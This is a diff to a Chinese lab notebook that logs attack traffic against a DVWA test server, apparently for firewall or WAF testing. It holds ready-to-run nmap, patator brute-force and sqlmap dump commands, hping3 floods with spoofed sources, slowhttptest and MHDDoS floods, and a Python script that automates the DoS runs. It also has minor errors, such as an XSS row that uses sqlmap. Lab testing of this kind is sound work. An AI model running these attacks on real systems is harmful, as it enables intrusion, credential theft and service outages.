@@ -481,3 +481,172 @@ if __name__ == "__main__":
 
 ```
 
+# 四、4.20攻击记录
+| 攻击流量大类 | 攻击流量小类     | 工具                 | 172.31.171.162攻击起始点 | 172.31.171.155攻击起始点 | OSI层级               | 命令                                                         | 备注                                                |
+| ------------ | ---------------- | -------------------- | ------------------------ | ------------------------ | --------------------- | ------------------------------------------------------------ | --------------------------------------------------- |
+| 扫描攻击     | 操作系统扫描     | nmap                 | 10:00                    | 10:01                    | 网络层/传输层 (L3/L4) | sudo nmap -O 172.31.132.2                                    |                                                     |
+| 扫描攻击     | 端口扫描         | nmap                 | 10:02                    | 10:01                    | 传输层 (L4)           | sudo nmap -p- 172.31.132.2                                   |                                                     |
+| 暴力破解     | FTP 破解         | patator              | 10:07                    | 10:37                    | 应用层 (L7)           | patator ftp_login host=172.31.132.2 user=root password=FILE0 0=/usr/share/wordlists/dirb/common.txt |                                                     |
+| 暴力破解     | SSH 破解         | patator              | 10:10                    | 10:41                    | 应用层 (L7)           | patator ssh_login host=172.31.132.2 user=root password=FILE0 0=/usr/share/wordlists/dirb/common.txt |                                                     |
+| Web 攻击     | XSS 攻击         | sqlmap               | 10:14                    | 10:45                    | 应用层 (L7)           | sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=http://172.31.132.2:8080/tos65u8ssfccgts283ltf8c337" -D dvwa -T users --dump --batch | 修改cookies                                         |
+| Web 攻击     | SQL 注入         | sqlmap               | 10:15                    | 10:47                    | 应用层 (L7)           | 检测注入漏洞`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tos65u8ssfccgts283ltf8c337; security=low" --batch`<br />枚举数据库名称`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tos65u8ssfccgts283ltf8c337; security=low" --dbs --batch`<br />查看当前使用的数据库`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tos65u8ssfccgts283ltf8c337; security=low" --current-db --batch`<br />枚举指定数据库下的所有表`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tos65u8ssfccgts283ltf8c337; security=low" -D dvwa --tables --batch`<br />窃取特定表的数据`sudo sqlmap -u "http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tos65u8ssfccgts283ltf8c337; security=low" -D dvwa -T users --dump --batch`<br /> | 修改cookies                                         |
+| Web攻击      | 命令注入         | command_injection.py | 10:18                    | 10:10                    | 应用层(L7)            | python3 command_injection.py                                 |                                                     |
+| Web攻击      | 代码注入         | file_inclusion.py    | 10:22                    | 10:15                    | 应用层(L7)            | python3 file_inclusion.py                                    |                                                     |
+| 系统攻击     | system漏洞攻击   | msfconsole           | 10:24                    | 10:02、10:11             | 传输层(L4)            |                                                              |                                                     |
+| Web攻击      | database漏洞攻击 | sqli_attack.py       | 10:28                    | 10:06                    | 应用层(L7)            | python3 sqli_attack.py                                       |                                                     |
+| Web攻击      | 口令暴力破解攻击 | brute_force.py       | 10:32                    | 10:08、10:30             | 应用层(L7)            | python3 brute_force.py                                       |                                                     |
+| Web攻击      | IoT漏洞攻击      | iot_attack.py        | 10:36                    | 10:13                    | 应用层(L7)            | python3 iot_attack.py                                        |                                                     |
+| Web攻击      | xss漏洞攻击      | xss_attack.py        |                          | 10:17                    | 应用层(L7)            | python3 xss_attack.py                                        |                                                     |
+| Web攻击      | csrf漏洞攻击     | csrf_attack          |                          | 10:18                    | 应用层(L7)            | python3 csrf_attack                                          |                                                     |
+| DDos         | syn flood        | hping3               | 10:42                    | 10:51                    | 传输层 (L4)           | sudo hping3 -S --flood --rand-source -d 0 -p 8080 172.31.132.2<br /> | 防火墙关闭，桥接模式，SYN Flood，6线程              |
+| DDos         | udp flood        | hping3               | 10:45                    | 10:06、10:51             | 传输层 (L4)           | sudo hping3 --udp --flood --rand-source -d 0 -p 8080 172.31.132.2 | 防火墙关闭，桥接模式，UDP Flood，6线程              |
+| DDos         | icmp flood       | hping3               | 10:49                    | 10:52                    | 网络层 (L3)           | sudo hping3 --icmp --flood --rand-source -d 56 172.31.132.2  | 防火墙关闭，桥接模式，UDP Flood，6线程              |
+| DDos         | icmp flood       | hping3               | 10:51                    | 10:53                    | 网络层 (L3)           | sudo hping3 --icmp --flood --rand-source -d 1000 172.31.132.2 | 防火墙关闭，桥接模式，ICMP Flood（超大ICMP），6线程 |
+| DDos         | syn flood        | hping3               | 10:52                    |                          | 传输层 (L4)           | hping3 -S --flood -d 0 -p 8080 172.31.132.2                  | 防火墙关闭，net模式                                 |
+| DDos         | udp flood        | hping3               | 10:54                    |                          | 传输层 (L4)           | hping3 --udp --flood -d 0 -p 8080 172.31.132.2               | 防火墙关闭，net模式                                 |
+| DDos         | icmp flood       | hping3               | 10:55                    |                          | 网络层 (L3)           | hping3 --icmp --flood -d 56 172.31.132.2                     | 防火墙关闭，net模式                                 |
+
+# 五、慢速攻击和L7攻击测试
+## 5.1 low-rate ddos
+1. MHDoS慢速攻击：（先在MHDDoS文件夹里`touch empty.txt`）(13:22~13:27)
+     python3 start.py SLOW http://172.31.132.2:8080/ 5 500 empty.txt 10 300
+     
+2. slowloris(慢速请求头)：发送不完整的HTTP Header，让服务器一直等着。(13:42~13:44)
+     slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://172.31.132.2:8080/ -x 24 -p 3
+
+3. slow post(慢速正文)：模拟大文件上传，但每次只发一个字节。(13:47~13:48)
+     slowhttptest -c 1000 -B -i 10 -r 200 -s 8192 -t POST -u http://172.31.132.2:8080/ -x 10 -p 3
+
+4. slow read(慢速读取)：接收响应非常慢，强迫服务器将数据缓存在内核中。(13:50~13:52)
+     slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -u http://172.31.132.2:8080/
+
+## 5.2 MHDoS
+## 5.2.1 安装
+CC 攻击利用的是 HTTP 协议，模拟真实用户的浏览行为，这里选择MHDoS
+```BASH
+cd MHDDoS
+git clone https://github.com/MatrixTM/MHDDoS.git
+python3 -m venv mhddos
+source mhddos/bin/activate
+pip install -r requirements.txt
+python3 start.py
+```
+
+## 5.2.2 HTTP Flood
+```BASH
+python3 start.py GET http://172.31.132.2:8080/ 5 2000 empty.txt 100 300(13:54~13:59)
+```
+
+## 5.2.3 CC攻击
+```BASH
+python3 start.py POST http://172.31.132.2:8080/ 5 1500 empty.txt 50 300(14:02~14:07)
+```
+
+# 六、慢速攻击和L7自动化攻击脚本
+## 6.1 脚本
+自动化攻击脚本👇（先进入`/MHDDoS`）
+```PYTHON
+import subprocess
+import time
+import os
+from datetime import datetime, timedelta
+
+# 1. 配置信息
+TARGET_URL = "http://172.31.132.2:8080/login.php"
+COOLDOWN_TIME = 60  # 冷却时间，确保服务器连接完全释放
+
+# --- 路径自动校准 ---
+MHDDOS_PATH = "/root/sec/attacker/MHDDoS"
+
+# 自动寻找存在的 Python 解释器
+potential_pythons = [
+    os.path.join(MHDDOS_PATH, "mhddos/bin/python3"), 
+    os.path.join(MHDDOS_PATH, "venv/bin/python3"),
+    "/usr/bin/python3"
+]
+
+VENV_PYTHON = ""
+for p in potential_pythons:
+    if os.path.exists(p):
+        VENV_PYTHON = p
+        break
+
+if not VENV_PYTHON:
+    print("❌ 错误：找不到任何可用的 Python 解释器！")
+    exit(1)
+
+# 2. 任务清单 (格式: 任务名, 工具, 命令, 预计运行秒数)
+# 定义代理文件的绝对路径
+PROXY_FILE = os.path.join(MHDDOS_PATH, "files/proxies/empty.txt") #
+tasks = [
+    ("慢速攻击slowloris", "slowhttptest", f"slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u {TARGET_URL} -x 24 -p 3", 240),
+    ("慢速攻击slow post", "slowhttptest", f"slowhttptest -c 1000 -B -i 10 -r 200 -s 8192 -t POST -u {TARGET_URL} -x 10 -p 3", 240),
+    ("慢速攻击slow read", "slowhttptest", f"slowhttptest -c 1000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -u {TARGET_URL}", 240),
+    ("慢速攻击", "MHDDoS", f"{VENV_PYTHON} {MHDDOS_PATH}/start.py SLOW {TARGET_URL} 5 500 {PROXY_FILE} 10 300", 300),
+    ("HTTP Flood", "MHDDoS", f"{VENV_PYTHON} {MHDDOS_PATH}/start.py GET {TARGET_URL} 5 2000 {PROXY_FILE} 100 300", 300),
+    ("CC攻击", "MHDDoS", f"{VENV_PYTHON} {MHDDOS_PATH}/start.py POST {TARGET_URL} 5 1500 {PROXY_FILE} 50 300", 300)
+]
+
+results = []
+
+def run_research():
+    total_task_seconds = sum(task[3] for task in tasks)
+    total_cooldown_seconds = COOLDOWN_TIME * (len(tasks) - 1)
+    total_duration = total_task_seconds + total_cooldown_seconds
+    eta_finish = datetime.now() + timedelta(seconds=total_duration)
+
+    print(f"✅ 成功锁定 Python 路径: {VENV_PYTHON}")
+    print(f"🚀 自动化实验开始 | 目标: {TARGET_URL}")
+    print(f"📅 当前时间: {datetime.now().strftime('%H:%M:%S')}")
+    print(f"⌛ 总预计耗时: {total_duration // 60} 分 {total_duration % 60} 秒")
+    print(f"🏁 预计全部结束时间: {eta_finish.strftime('%H:%M:%S')}")
+    print("=" * 60)
+
+    for i, (name, tool, cmd, duration) in enumerate(tasks, 1):
+        start_t_obj = datetime.now()
+        start_t_str = start_t_obj.strftime("%H:%M")
+        task_eta = start_t_obj + timedelta(seconds=duration)
+
+        print(f"\n[任务 {i}/{len(tasks)}] 执行中: {name}")
+        print(f"⏱️ 预计此项结束时间: {task_eta.strftime('%H:%M:%S')}")
+
+        try:
+            # 去掉 check=True，改为 check=False
+            # 这样即使 MHDDoS 返回 1，脚本也会认为它运行结束了，继续往下走
+            result = subprocess.run(cmd, shell=True, check=False, cwd=MHDDOS_PATH, capture_output=False)
+
+            # 记录为成功，因为我们知道它运行够了时间
+            end_t_str = datetime.now().strftime("%H:%M")
+            results.append({"type": name, "tool": tool, "time": f"{start_t_str}~{end_t_str}"})
+            print(f"✅ 攻击任务已完成（程序退出码: {result.returncode}）")
+
+        except Exception as e:
+            # 只有脚本自己崩了（比如找不到 Python 解释器）才会走这里
+            print(f"❌ 脚本逻辑触发异常: {e}")
+
+    # --- 生成报告 ---
+    print("\n" + "="*20 + " 实验结果统计 " + "="*20)
+    md = "|攻击类型|工具|时间段|\n|-------|---|-----|\n"
+    for r in results:
+        md += f"|{r['type']}|{r['tool']}|{r['time']}|\n"
+
+    print(md)
+    with open("report.md", "w", encoding="utf-8") as f:
+        f.write(md)
+    print(f"💾 结果已保存至 {os.getcwd()}/report.md")
+
+if __name__ == "__main__":
+    run_research()
+```
+
+## 6.2 初代版本问题
+结果只得到了如图的结果，检测到使用明文登录，且url是`172.31.132.2:8080/login.php`而非`172.31.132.2:8080`
+![](images/1.png)
+
+因为DVWA是需要登录的，尚未携带有效 Session/Cookie 访问根目录，dvwa会强制给出`302 Found`响应，重定向到`/login.php`
+
+而MHDDoS向`http://172.31.132.2:8080/login.php`发送`POST`请求时，防火墙的Web应用防护(WAF)模块介入，检测到有人通过非加密的HTTP协议，向一个登录界面提交POST表单。
+
+**改进思路**
+1. 绕过302重定向：`TARGET_URL = "http://172.31.132.2:8080/login.php"`，直接攻击`login.php`
+2. 脚本中的`subprocess.run(..., check=False, shell=True)`修改为`subprocess.run(cmd, shell=True, check=False, cwd=MHDDOS_PATH, capture_output=False)`
